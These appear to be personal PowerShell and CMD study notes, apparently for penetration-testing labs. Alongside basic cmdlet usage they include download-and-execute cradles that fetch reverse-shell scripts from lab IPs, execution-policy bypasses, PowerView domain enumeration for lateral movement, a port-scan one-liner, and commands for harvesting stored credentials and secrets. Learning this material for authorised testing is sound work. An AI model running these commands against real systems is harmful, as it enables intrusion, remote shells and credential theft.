What is a Powershell?
	-> Powershell is the Windows Scripting Language and shell environment that is built using the .NET framework. 
	-> This also allows Powershell to execute .NET functions directly from its shell. Most Powershell commands, called cmdlets, are written in .NET. Unlike other scripting languages and shell environments, the output of these cmdlets are objects - making Powershell somewhat object oriented. 
	-> This also means that running cmdlets allows you to perform actions on the output object(which makes it convenient to pass output from one cmdlet to another).
	-> The normal format of a cmdlet is represented using Verb-Noun; for example the cmdlet to list commands is called Get-Command.
	-> Common verbs to use include:
		1. Get
		2. Start
		3. Stop
		4. Read
		5. Write
		6. New
		7. Out
	-> Link for approved verbs: https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7


Creating Objects From Previous cmdlets 
	-> One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the Select-Object cmdlet. 

Filtering objects
	-> When retrieving output objects, you may want to select objects that match a very specific value. You can do this using the Where-Object to filter based on the value of properties. 

	Format: Verb-Noun | Where-Object -Property PropertyName -operator Value
	Format: Verb-Noun | Where-Object {$_.PropertyName -operator Value}
		-> This version  uses the $_ operator to iterate through every object passed to the Where-Object cmdlet.

	Where -operator is a list of the following operators
		-Contains: if any item in the property value is an exact match for the specified value.
		-EQ: if the property value is the same as the specified value
		-GT: if the property value is greater than the specified value


Sorting Objects
	When a cmdlet outputs a lot of information, you may need to sort it to extract the information more efficiently. You do this by pipe lining the output of a cmdlet to the Sort-Object cmdlet.

	The format of the command would be: Verb-Noun | Sort-Object


Basic Powershell commands
	1. Get-Help [Command-Name]
		-Examples - use this switch to understand how exactly the command works.
		example: Get-Help Get-Command -Examples

	2. Get-Command [Verb-* or *-Noun] - Get-Command gets all the cmdlets installed on the current Computer. 
		example: Get-Command New-*
	
	3. Get-Command | Get-Member -MemberType Method - fetch members of Get-Command 
	
	4. Select-Object - One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. 
		-first - gets the first x object
		-last - gets the last x object
		-unique - shows the unique objects
		-skip - skips x objects	

		example: Get-ChildItem | Select-Object -Property Mode, Name

	5. Get-Service | Where-Object -Property Status -EQ Stopped
	6. Get-ChildItem | Sort-Object
	7. Get-Content [filename] - reads the contents of the file. Like 'type' command.
	8. some command | Measure-Object - measures count, average and so on of the objets from the output of a command.
	9. Get-FileHash -Algorithm [md5,sha512,....] [filename]
	10.Get-Location - prints working directory
	11.Get-ChildItem -Path [path] -Force -ErrorAction SilentlyContinue -Recurse 
	12.Invoke-WebRequest -Uri www.google.com - like curl command
	13.$env:UserName - same as whoami

Enumeration using Powershell
	1. Get-LocalUser - lists all the local users
	2. Get-LocalUser | Where-Object -Property PasswordRequired -Match False - lists users which have passwords disabled.
	3. Get-LocalGroup - lists all the groups of the current user.
	4. Get-NetIPAddress - ipconfig /all
	5. Get-NetTCPConnection - lists tcp connections
	6. Get-WmiObject -Class win32_quickfixengineering - lists all the patches applied.
	7. Get-HotFix - lists patches
	8. ps - lists processes
	9. Get-ChildItem -Recurse | Select-String "API_KEY" -List - lists all files containing the pattern API_KEY 
	10. Get-ScheduledTask, Get-ScheduledJob - lists scheduled tasks and jobs.
	11. (Get-Acl <folder name>).Access | Format-Table IdentityReference,FileSystemRights,AccessControlType,IsInherited,InheritanceFlags -AutoSize
		-> This command will lists folder/file permissions.
	12.1..15 | %{echo "10.0.2.$_"; ping -n 1 10.0.2.$_ | Select-String ttl}
		-> This command will ping the hosts in the range given, and grep out the ttl part, if the host is up.
	13.1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("localhost", $_)) "Open port on - $_"} 2>$null
		-> This command will output all open ports and this command can be used on remote targets as well.

Manipulating files:
	1. Start-Process notepad.exe - This command can be used to start a process. Here it will open a notepad window.
	2. Get-Process - lists all running processes 
		-name: parameter to filter for a specific process name.
	3. Export-Csv - this command will create a csv file from the output of the previous command.
		Example: Get-Process | Export-Csv running_processes.csv 
	4. Get-Content [filename] - similar to cat on linux and type on win cmd.
	5. Copy-Item/Move-Item [source file] [destination file] - copy and move.
	6. Get-FileHash -Alogorithm MD5/SHA256/... [filename] - calculate hash of a file.
	7. Out-File [filename] - used to save the output to a file.

Downloading Files:
	1. (New-Object System.Net.WebClient).DownloadFile('infile','outfile')
	2. Invoke-WebRequest [link to file] -OutFile [file]
	3. echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #from cmd and execute
	Note: Once the script has been downloaded, you may run into the first related to PowerShell: ExecutionPolicy. It is important to note that, as Microsoft clearly states in the related documentation, “ExecutionPolicy” is NOT a security feature. It merely functions as an added safety measure and can be bypassed by the user. 
		>Get-ExecutionPolicy -list

		->  Execution policies can have seven different values;
    		1. AllSigned: Scripts can run but require all scripts to be signed by a trusted publisher.
    		2. Bypass: All scripts can run, and no warnings or prompts will be displayed.
    		3. Default: This refers to “restricted” for Windows clients and “RemoteSigned” for Windows 			servers.
    		4. RemoteSigned: Scripts can run, and this does not require local scripts to be digitally signed.
    		5. Restricted: The default configuration for Windows clients. Allows individual commands to run, 	does not allow scripts.
    		6. Undefined: This shows that no specific execution policy was set. This means default execution 	policies will be enforced.
    		7. Unrestricted: Most scripts will run. 
    How to bypass execution policy?
    	1. powershell -ExecutionPolicy Bypass -File [script]
    	2. Set-ExecutionPolicy Bypass -Scope Process
    		-> The “-scope” parameter will set the execution policy only for the current PowerShell session and will go back to the initial settings once the PowerShell session is closed.


Using Active Directory Module in Powershell:
	>Import-Module ActiveDirectory
	>Get-ADDomain | Select-Object NetBIOSName, DNSRoot, InfrastructureMaster
	>Get-ADForest | Select-Object Domains
	>Get-ADTrust -Filter * | Select-Object Direction, Source, Target

Using PowerView.ps1:
	PowerView is one of the most effective ways to gather information about the domain. Remember that you may need to bypass the execution policy to be able to run the script.
	1. Import-Module .\powerview.ps1
	2. Get-NetDomainController - Collects information about the domain controller.
		-> Knowing the IP address of the domain controller will be useful to conduct MITM attacks and to focus our efforts on high-value targets.
	3. Get-NetUser - lists domain users and their properties.
		-> The output can be intimidating. You can use format-table to list only useful columns.
		Examples:
		Get-NetUser | Format-Table name,pwdlastset,lastlogon
		Get-NetUser | Out-GridView 
	4. Get-NetComputer - useful to enumerate systems connected to the domain.
		-> -ping switch can also be used to see which systems are currently online in the domain.
	5. Get-NetGroup - enumerates existing groups in the domain.
		Note: Some accounts can be members of important groups, such as domain admins. Knowing which accounts have useful privileges or are a member of groups of interest will be useful for lateral movement and privilege escalation.
	6. Get-NetGroupMember [Group Name] - enumerate members of the group
		example: Get-NetGroupMember "Domain Admins"
	7. Find-DomainShare - lists available shares.
		-CheckShareAccess - lists only readable shares.
	8. Get-NetGPO - will gather information on enforced policies.
		Note: Group Policy is used to configure computers connected to the domain. Spending some time understanding what policies are set can provide potential attack vectors (is Windows Defender disabled? Is the firewall disabled? Etc.) 
	9. Get-NetDomainTrust - will list any domain you may access.
		-> The domain you are testing can have a trust relationship with another domain. If this is the case, you may be able to extend the scope of the reconnaissance to that domain.
	10. -Domain - This parameter can be used with any command followed by the name of the other domain:
			Example: Get-NetUser -Domain infra.munn.local
	11. Find-LocalAdminAccess - will list systems in the domain you may have access as a local administrator.
		-> Knowing which systems the current user can access with local administrator privileges can facilitate lateral movement.
	12. Get-NetDomain: info about forest, dc's, and domain name are enumerated.
	13. Get-NetForest - Get-NetForest is similar to Get-ADForest, and provides similar output. It provides all the associated Domains, the root domain, as well as the Domain Controllers for the root domain.
	14. Get-NetDomainTrust - Get-NetDomainTrust is similar to Get-ADTrust with our SelectObject filter applied to it. It’s short, sweet and to the point!

	Source for more information: https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview

	

Formatting Options:
	1. Format-Table Column1,Column2,...
	2. Format-List - can be used to gather more information/properties about an object.
		Examples: dir | Format-List
		-> If you want more properties to be displayed about an object, then use * after Format-List.
	3. findstr [string/column_name]
	4. Sort-Object
	5. Out-GridView - opens up a nice gui with sortable columns for any output.
	6. Select -ExpandProperty name - this cmdlet will display only the name property of the object.


Powershell Scripting:
	-> Variables are defined using $[variable]
	Format: $variable_name = value
	-> for loop syntax:
		foreach(condition){}
		Example: 
			foreach($port in $text_port){
				//Do something
			}
	-> If condition syntax:
		example: if($port -in $system_ports.LocalPort){
			echo $port
		}
	Powershell scripting resource: https://learnxinyminutes.com/docs/powershell/

Script Example
	1. Simple script to query for password in files:
		$path = "C:\Users\Administrator\Desktop\emails"
		$query_string = "password"
		$cmd = Get-ChildItem -Path $path -Recurse | Select-String -Pattern $query_string
		echo $cmd


Powershell Useful Commands:
$password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)

Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7:5555/shell.ps1')" -Credential $cred
	-> shell.ps1 from InvokeReverseTcp (Nishang repo)

#run an executable from powershell:
Start-Process '<filename>'

To extract PS Credentials from a file:
	>$credential = Import-CliXml -Path [Path to ps cred file]
	>$credential.GetNetwork.Credential().Password

CMD useful commands:

	>where /R c:\windows [name of file]
	>dir /R - to see deeper contents

	Reading hidden data within files:
		> more < filename:hiddenfilename:$DATA

	Running powershell and then a custom script (PowerUp.ps1)
		>powershell -ep bypass
		>. .\PowerUp.ps1
		>Invoke-AllChecks

	If running "powershell -ep bypass" makes cmd freeze, then run:
		>powershell -ep bypass .\PowerUp.ps1 

	copy /y [file] [destination[filename]] -> to copy file to a destination.
	copy [file] //<remote-ip>/share -> copy a file to a remote share.

	Query service:
		>sc qc [service name]
		>sc query [service name]
		
	Look at directory or file permissions:
		>icacls [filename]

	Grant permissions using icacls
		>icacls [filename] /grant "machine-name\username":(F)

	Look at scheduled tasks
		>schtasks

	echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.20/Invoke-PowerShellTcp.ps1') | powershell -noprofile - #from cmd and execute.